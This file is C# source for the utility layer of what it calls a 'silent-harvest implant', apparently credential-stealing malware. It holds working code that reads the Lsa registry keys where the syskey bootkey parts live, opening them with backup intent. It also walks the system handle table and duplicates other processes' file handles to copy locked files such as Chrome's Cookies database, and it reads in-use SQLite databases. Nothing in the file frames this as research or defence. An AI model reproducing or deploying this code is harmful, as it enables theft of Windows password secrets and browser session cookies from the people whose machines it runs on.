// silent-harvest implant — utility layer (json writer, registry helper, logging)
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SilentHarvest
{
    public static class Util
    {
        public static void Log(string fmt, params object[] args)
        {
#if DEBUG_LOG
            Console.WriteLine("[sh] " + string.Format(fmt, args));
#endif
        }

        public static string EscapeJson(string s)
        {
            if (s == null) return "";
            StringBuilder sb = new StringBuilder();
            foreach (char c in s)
            {
                switch (c)
                {
                    case '"': sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        if (c < 0x20) sb.Append("\\u").Append(((int)c).ToString("x4"));
                        else sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        public static string B64(byte[] b) { return b == null ? "" : Convert.ToBase64String(b); }

        // minimal JSON object builder preserving insertion order
        public class JsonObj
        {
            private List<string> pairs = new List<string>();
            public JsonObj Add(string key, string value)
            {
                pairs.Add("\"" + EscapeJson(key) + "\":\"" + EscapeJson(value) + "\""); return this;
            }
            public JsonObj AddRaw(string key, string rawJson)
            {
                pairs.Add("\"" + EscapeJson(key) + "\":" + rawJson); return this;
            }
            public override string ToString()
            {
                return "{" + string.Join(",", pairs.ToArray()) + "}";
            }
        }

        /// <summary>
        /// The core registry read: NtOpenKeyEx(REG_OPTION_BACKUP_RESTORE) +
        /// one bulk RegQueryMultipleValuesW call for all requested values.
        /// The backup-intent open requires SeBackupPrivilege by design; when it
        /// is missing we fall back to a plain open so readable keys still work.
        /// Returns per-value (type, data) or an ntstatus error string.
        /// </summary>
        public static Dictionary<string, object> ReadKeyValues(string ntPath, string[] valueNames)
        {
            Dictionary<string, object> results = new Dictionary<string, object>();
            IntPtr hKey;
            IntPtr[] toFree = null;
            try
            {
                Native.OBJECT_ATTRIBUTES oa = Native.MakeObjectAttributes(ntPath, out toFree);
                int st = Native.NtOpenKeyEx(out hKey, Native.KEY_READ, ref oa,
                                            Native.REG_OPTION_BACKUP_RESTORE);
                bool fellBack = false;
                if (st != 0)
                {
                    // without SeBackupPrivilege the backup-intent open is denied;
                    // retry the same open without backup semantics
                    st = Native.NtOpenKeyEx(out hKey, Native.KEY_READ, ref oa, 0);
                    fellBack = st == 0;
                }
                if (st != 0)
                {
                    results["_status"] = Native.NtStatusName(st);
                    return results;
                }
                try
                {
                    // build native VALENTW array
                    int n = valueNames.Length;
                    IntPtr[] namePtrs = new IntPtr[n];
                    IntPtr valArr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Native.VALENTW)) * n);
                    for (int i = 0; i < n; i++)
                    {
                        namePtrs[i] = Marshal.StringToHGlobalUni(valueNames[i]);
                        Native.VALENTW v = new Native.VALENTW();
                        v.ve_valuename = namePtrs[i];
                        v.ve_valuelen = 0;
                        v.ve_valueptr = IntPtr.Zero;
                        v.ve_type = 0;
                        Marshal.StructureToPtr(v, (IntPtr)((long)valArr + i * Marshal.SizeOf(typeof(Native.VALENTW))), false);
                    }

                    int total = 0;
                    IntPtr buf = IntPtr.Zero;
                    int rc = Native.RegQueryMultipleValuesW(hKey, valArr, (uint)n, IntPtr.Zero, ref total);
                    if (rc == Native.ERROR_MORE_DATA || rc == 0)
                    {
                        buf = Marshal.AllocHGlobal(total + 16);
                        rc = Native.RegQueryMultipleValuesW(hKey, valArr, (uint)n, buf, ref total);
                    }
                    if (rc != 0)
                    {
                        results["_status"] = "RegQueryMultipleValuesW rc=" + rc;
                        if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf);
                        for (int i = 0; i < n; i++) Marshal.FreeHGlobal(namePtrs[i]);
                        Marshal.FreeHGlobal(valArr);
                        return results;
                    }

                    // read back the array: ve_valueptr now points into buf
                    for (int i = 0; i < n; i++)
                    {
                        Native.VALENTW v = (Native.VALENTW)Marshal.PtrToStructure(
                            (IntPtr)((long)valArr + i * Marshal.SizeOf(typeof(Native.VALENTW))),
                            typeof(Native.VALENTW));
                        byte[] data = new byte[v.ve_valuelen];
                        if (v.ve_valuelen > 0 && v.ve_valueptr != IntPtr.Zero)
                            Marshal.Copy(v.ve_valueptr, data, 0, v.ve_valuelen);
                        results[valueNames[i]] = new int[] { v.ve_type, v.ve_valuelen };
                        results["#" + valueNames[i]] = data;
                    }

                    if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf);
                    for (int i = 0; i < n; i++) Marshal.FreeHGlobal(namePtrs[i]);
                    Marshal.FreeHGlobal(valArr);
                    results["_status"] = fellBack ? "OK(no-backup-priv)" : "OK";
                    return results;
                }
                finally
                {
                    Native.RegCloseKey(hKey);
                }
            }
            finally
            {
                Native.FreeObjectAttributes(toFree);
            }
        }

        /// <summary>
        /// Read a key's class name (where the syskey bootkey components live
        /// under Lsa\{JD,Skew1,GBG,Data}). Opens with backup intent first.
        /// </summary>
        public static Dictionary<string, object> ReadKeyClass(string ntPath)
        {
            Dictionary<string, object> results = new Dictionary<string, object>();
            IntPtr hKey;
            IntPtr[] toFree = null;
            try
            {
                Native.OBJECT_ATTRIBUTES oa = Native.MakeObjectAttributes(ntPath, out toFree);
                int st = Native.NtOpenKeyEx(out hKey, Native.KEY_READ, ref oa,
                                            Native.REG_OPTION_BACKUP_RESTORE);
                if (st != 0)
                    st = Native.NtOpenKeyEx(out hKey, Native.KEY_READ, ref oa, 0);
                if (st != 0)
                {
                    results["_status"] = Native.NtStatusName(st);
                    return results;
                }
                try
                {
                    System.Text.StringBuilder cls = new System.Text.StringBuilder(256);
                    int cch = 256;
                    int rc = Native.RegQueryInfoKeyW(hKey, cls, ref cch, IntPtr.Zero,
                        IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                        IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                    if (rc != 0)
                    {
                        results["_status"] = "RegQueryInfoKeyW rc=" + rc;
                        return results;
                    }
                    results["<class>"] = new int[] { 0, cch };
                    results["#<class>"] = System.Text.Encoding.Unicode.GetBytes(cls.ToString());
                    results["_status"] = "OK";
                    return results;
                }
                finally { Native.RegCloseKey(hKey); }
            }
            finally { Native.FreeObjectAttributes(toFree); }
        }

        /// <summary>
        /// Read a file that another same-user process holds with exclusive share
        /// mode (e.g. Chrome's Cookies DB) by walking the system handle table,
        /// finding the owning process's handle and duplicating it into us.
        /// Returns file bytes or null.
        /// </summary>
        public static byte[] ReadFileViaHandleDup(string pathSuffix)
        {
            if (IntPtr.Size != 8) return null; // entry layout below is x64

            int fileType = GetFileTypeIndex();
            if (fileType < 0) return null;

            // snapshot the handle table
            IntPtr buf = IntPtr.Zero;
            int len = 0x100000;
            int retLen;
            int st = unchecked((int)0xC0000004);
            for (int attempt = 0; attempt < 6 && st == unchecked((int)0xC0000004); attempt++)
            {
                if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf);
                buf = Marshal.AllocHGlobal(len);
                st = Native.NtQuerySystemInformation(Native.SystemExtendedHandleInformation,
                                                     buf, len, out retLen);
                if (st == unchecked((int)0xC0000004)) len *= 2;
            }
            if (st != 0) { if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf); return null; }

            long nHandles = Marshal.ReadInt64(buf, 0);
            long entrySize = 40; // SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX on x64
            long baseOff = 16;   // header: NumberOfHandles + Reserved
            int myPid = System.Diagnostics.Process.GetCurrentProcess().Id;
            string suffix = pathSuffix.ToLowerInvariant();
            Util.Log("handle-walk: typeIndex={0} handles={1} suffix={2}", fileType, nHandles, suffix);

            try
            {
                long considered = 0, dupOk = 0, named = 0, matched = 0;
                for (long i = 0; i < nHandles; i++)
                {
                    long off = baseOff + i * entrySize;
                    long pid = Marshal.ReadInt64(buf, (int)off + 8);
                    long handleVal = Marshal.ReadInt64(buf, (int)off + 16);
                    int granted = Marshal.ReadInt32(buf, (int)off + 24);
                    short typeIdx = Marshal.ReadInt16(buf, (int)off + 30);
                    if (typeIdx != fileType) continue;
                    if (pid == myPid) continue;
                    if ((granted & 0x1) == 0) continue; // FILE_READ_DATA (GENERIC_READ maps to FILE_GENERIC_READ)
                    considered++;

                    IntPtr hProc = Native.OpenProcess(Native.PROCESS_DUP_HANDLE, false, (int)pid);
                    if (hProc == IntPtr.Zero) continue;
                    IntPtr dup;
                    byte[] result = null;
                    try
                    {
                        if (!Native.DuplicateHandle(hProc, (IntPtr)handleVal,
                                Native.GetCurrentProcess(), out dup, 0, false,
                                Native.DUPLICATE_SAME_ACCESS)) continue;
                        dupOk++;

                        try
                        {
                            string name = QueryObjectNameTimed(dup, 200);
                            if (name == null) continue;
                            named++;
                            if (!name.ToLowerInvariant().EndsWith(suffix)) continue;
                            matched++;

                            int hi;
                            long size = Native.GetFileSize(dup, out hi);
                            if (hi != 0 || size <= 0 || size > 96 * 1024 * 1024) continue;

                            // offset-addressed reads: never touch the shared
                            // FILE_OBJECT's CurrentByteOffset, so the owning
                            // process's I/O stays perfectly consistent while
                            // we copy the file underneath it (no seek race)
                            byte[] data = new byte[size];
                            uint totalRead = 0;
                            byte[] chunk = new byte[1 << 20];
                            bool ok = true;
                            while (totalRead < size)
                            {
                                uint want = (uint)Math.Min((long)chunk.Length, size - totalRead);
                                long roff = totalRead;
                                var iosb = new Native.IO_STATUS_BLOCK();
                                int ntst = Native.NtReadFile(dup, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                                    ref iosb, chunk, want, ref roff, IntPtr.Zero);
                                uint gotR = (uint)iosb.Information.ToInt64();
                                if (ntst < 0 || gotR == 0) { ok = false; break; }
                                Buffer.BlockCopy(chunk, 0, data, (int)totalRead, (int)gotR);
                                totalRead += gotR;
                            }
                            if (ok) result = data;
                        }
                        finally { Native.CloseHandle(dup); }
                    }
                    finally { Native.CloseHandle(hProc); }

                    if (result != null)
                    {
                        Util.Log("handle-walk: considered={0} dupOk={1} named={2} matched={3} -> READ",
                                 considered, dupOk, named, matched);
                        return result;
                    }
                }
                Util.Log("handle-walk: considered={0} dupOk={1} named={2} matched={3} -> miss",
                         considered, dupOk, named, matched);
            }
            finally
            {
                if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf);
            }
            return null;
        }

        private static string QueryObjectNameTimed(IntPtr handle, int timeoutMs)
        {
            // NtQueryObject can block on synchronous pipe handles; run it on a
            // sacrificial thread and give up after timeoutMs
            string name = null;
            System.Threading.Thread t = new System.Threading.Thread(delegate()
            {
                int len = 1024, retLen;
                IntPtr buf = Marshal.AllocHGlobal(len);
                try
                {
                    int st = Native.NtQueryObject(handle, Native.ObjectNameInformation,
                                                  buf, len, out retLen);
                    if (st == 0)
                    {
                        // OBJECT_NAME_INFORMATION { UNICODE_STRING Name; WCHAR Buffer[] }
                        int strLen = Marshal.ReadInt16(buf, 0);
                        IntPtr strBuf = Marshal.ReadIntPtr(buf, 8);
                        if (strLen > 0 && strBuf != IntPtr.Zero)
                            name = Marshal.PtrToStringUni(strBuf, strLen / 2);
                    }
                }
                catch { }
                finally { Marshal.FreeHGlobal(buf); }
            });
            t.IsBackground = true;
            t.Start();
            if (!t.Join(timeoutMs)) name = null; // thread abandoned on hang
            return name;
        }

        private static int GetFileTypeIndex()
        {
            // open a scratch file, find our own handle in the table, read its type
            string tmp = Path.Combine(Path.GetTempPath(), "sh_fti_" + Guid.NewGuid().ToString("N"));
            IntPtr h = Native.CreateFileW(tmp, Native.GENERIC_READ, 7, IntPtr.Zero,
                                          2 /*CREATE_ALWAYS*/, 0, IntPtr.Zero);
            if (h == Native.INVALID_HANDLE_VALUE) return -1;
            try
            {
                int myPid = System.Diagnostics.Process.GetCurrentProcess().Id;
                long myHandle = (long)h;
                IntPtr buf = IntPtr.Zero;
                int len = 0x100000;
                int retLen;
                int st = unchecked((int)0xC0000004);
                for (int attempt = 0; attempt < 6 && st == unchecked((int)0xC0000004); attempt++)
                {
                    if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf);
                    buf = Marshal.AllocHGlobal(len);
                    st = Native.NtQuerySystemInformation(Native.SystemExtendedHandleInformation,
                                                         buf, len, out retLen);
                    if (st == unchecked((int)0xC0000004)) len *= 2;
                }
                if (st != 0) { if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf); return -1; }
                long nHandles = Marshal.ReadInt64(buf, 0);
                try
                {
                    for (long i = 0; i < nHandles; i++)
                    {
                        long off = 16 + i * 40;
                        if (Marshal.ReadInt64(buf, (int)off + 8) == myPid &&
                            Marshal.ReadInt64(buf, (int)off + 16) == myHandle)
                            return Marshal.ReadInt16(buf, (int)off + 30);
                    }
                }
                finally { Marshal.FreeHGlobal(buf); }
                return -1;
            }
            finally
            {
                Native.CloseHandle(h);
                try { Native.DeleteFileW(tmp); } catch { }
            }
        }

        public static List<string> EnumSubKeys(IntPtr hKey)
        {
            List<string> names = new List<string>();
            for (int i = 0; i < 4096; i++)
            {
                StringBuilder sb = new StringBuilder(512);
                int len = 512;
                int rc = Native.RegEnumKeyExW(hKey, i, sb, ref len, IntPtr.Zero,
                                              IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                if (rc == Native.ERROR_NO_MORE_ITEMS) break;
                if (rc != 0) break;
                names.Add(sb.ToString());
            }
            return names;
        }

        public static List<string> EnumSubKeysOfNt(string ntPath, out string status)
        {
            status = null;
            List<string> names = new List<string>();
            IntPtr hKey;
            IntPtr[] toFree = null;
            try
            {
                Native.OBJECT_ATTRIBUTES oa = Native.MakeObjectAttributes(ntPath, out toFree);
                int st = Native.NtOpenKeyEx(out hKey, Native.KEY_READ, ref oa,
                                            Native.REG_OPTION_BACKUP_RESTORE);
                if (st != 0)
                    st = Native.NtOpenKeyEx(out hKey, Native.KEY_READ, ref oa, 0);
                if (st != 0) { status = Native.NtStatusName(st); return names; }
                try { return EnumSubKeys(hKey); }
                finally { Native.RegCloseKey(hKey); }
            }
            finally { Native.FreeObjectAttributes(toFree); }
        }

        /// <summary>Read a file allowing concurrent writers (in-use SQLite DBs).</summary>
        public static byte[] ReadFileLoose(string path)
        {
            IntPtr h = Native.CreateFileW(path, Native.GENERIC_READ,
                                         Native.FILE_SHARE_READ | Native.FILE_SHARE_WRITE | Native.FILE_SHARE_DELETE,
                                         IntPtr.Zero, Native.OPEN_EXISTING, Native.FILE_FLAG_BACKUP_SEMANTICS,
                                         IntPtr.Zero);
            if (h == Native.INVALID_HANDLE_VALUE) return null;
            try
            {
                int hi; long size = Native.GetFileSize(h, out hi);
                if (hi != 0) return null; // >2GB, absurd for our targets
                if (size > 96 * 1024 * 1024) return null;
                byte[] data = new byte[size];
                uint off = 0;
                byte[] chunk = new byte[1 << 20];
                while (off < size)
                {
                    uint want = (uint)Math.Min((long)chunk.Length, size - off);
                    uint read;
                    if (!Native.ReadFile(h, chunk, want, out read, IntPtr.Zero) || read == 0)
                        break;
                    Buffer.BlockCopy(chunk, 0, data, (int)off, (int)read);
                    off += read;
                }
                if (off != size) return null;
                return data;
            }
            finally { Native.CloseHandle(h); }
        }
    }
}
